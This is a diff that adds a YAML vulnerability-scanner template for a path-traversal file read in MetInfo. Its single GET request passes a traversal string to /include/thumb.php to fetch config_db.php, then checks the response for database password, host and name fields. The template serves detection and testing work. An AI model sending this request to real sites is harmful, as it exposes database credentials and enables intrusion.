@@ -1,0 +1,22 @@
+id: poc-yaml-metinfo-file-read
+info:
+  name: Metinfo File Read
+  severity: high
+  tags:
+  - 文件读取
+  finger: MetInfo
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /include/thumb.php?dir=http/.....///.....///config/config_db.php
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "con_db_pass") && contains(body,
+    "con_db_host") && contains(body, "con_db_name")
+  output: []
